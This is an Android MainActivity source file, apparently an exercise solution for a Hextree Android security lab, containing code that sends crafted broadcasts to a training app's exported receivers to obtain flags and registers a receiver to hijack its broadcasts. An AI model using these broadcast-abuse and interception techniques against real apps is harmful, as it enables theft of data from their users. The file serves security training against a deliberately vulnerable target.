package io.hextree.broadcast_receivers;

import static android.app.PendingIntent.FLAG_MUTABLE;
import static android.app.PendingIntent.FLAG_UPDATE_CURRENT;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.util.Log;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        findViewById(R.id.button).setOnClickListener(v -> {
//            Intent intent = new Intent();
//            intent.putExtra("flag", "give-flag-16");
//            intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.receivers.Flag16Receiver");
//            sendBroadcast(intent);

//            Intent intent = new Intent();
//            intent.putExtra("flag", "give-flag-17");
//            intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.receivers.Flag17Receiver");
//            sendOrderedBroadcast(intent, null, new BroadcastReceiver() {
//                @Override
//                public void onReceive(Context context, Intent intent) {
//                   Bundle bundle =  getResultExtras(false);
//                    if (bundle != null) {
//                        // read both keys
//                        boolean success = bundle.getBoolean("success");
//                        String flag = bundle.getString("flag");
//
//                        Log.i("HIJACKED", "success: " + success);
//                        Log.i("HIJACKED", "flag: " + flag);
//                    }
//                }
//            }, null, 0, null, null);
//
//
//            });

            // Hijacking Broadcast
//            BroadcastReceiver receivership = new hijackReceiver();
//            registerReceiver(receivership, new IntentFilter("io.hextree.broadcast.FREE_FLAG"));

            //Widgets
//            Intent intent = new Intent();
//            intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.receivers.Flag19Widget");
//
//            intent.setAction("APPWIDGET_UPDATE");
//
//            Bundle bundle = new Bundle();
//            bundle.putInt("appWidgetMaxHeight", 1094795585);
//            bundle.putInt("appWidgetMinHeight", 322376503);
//            intent.putExtra("appWidgetOptions",bundle);
//            sendBroadcast(intent);

            BroadcastReceiver receivership = new hijackReceiver();
            registerReceiver(receivership, new IntentFilter("io.hextree.broadcast.GIVE_FLAG"));


        });
    }
}